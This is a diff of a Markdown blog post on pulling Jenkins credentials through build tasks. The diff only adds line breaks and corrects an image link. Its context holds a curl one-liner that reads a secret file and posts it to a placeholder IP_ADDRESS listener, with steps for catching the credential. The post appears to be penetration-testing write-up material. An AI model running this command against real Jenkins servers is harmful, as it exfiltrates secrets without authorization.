@@ -17,6 +17,7 @@ You will need:
 
 I found this technique very useful for a project where some credentials were not correctly decrypted using typical tools such as [https://github.com/hoto/jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) which extract these values from the files credentials.xml, master.key and hudson.util.Secret.
 
+<br>
 
 ### Step 1: Use secret text(s) or file (s)
 
@@ -39,7 +40,7 @@ If the credential is a file you can create a second dummy environmental variable
 whoami; ip a; TEST2=$(cat "$TEST"); curl http://IP_ADDRESS:8081/ --data-binary '{"body": "'"$TEST2"'."}'
 ```
 
-![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_3.png)
+![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_2.png)
 
 The "whoami; ip a;" part is not necessary but you can use something like this to check the task is executed correctly even if step 3 fails. And you can use the port you prefer and not 8081.
 
@@ -51,3 +52,6 @@ In this example the Jenkins master node is a Linux system, but I guess something
 Finally, set up a listener and run the task, you should get the credential: 
 
 ![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jenkinscredentials/Screenshot_3.png)
+
+
+<br>
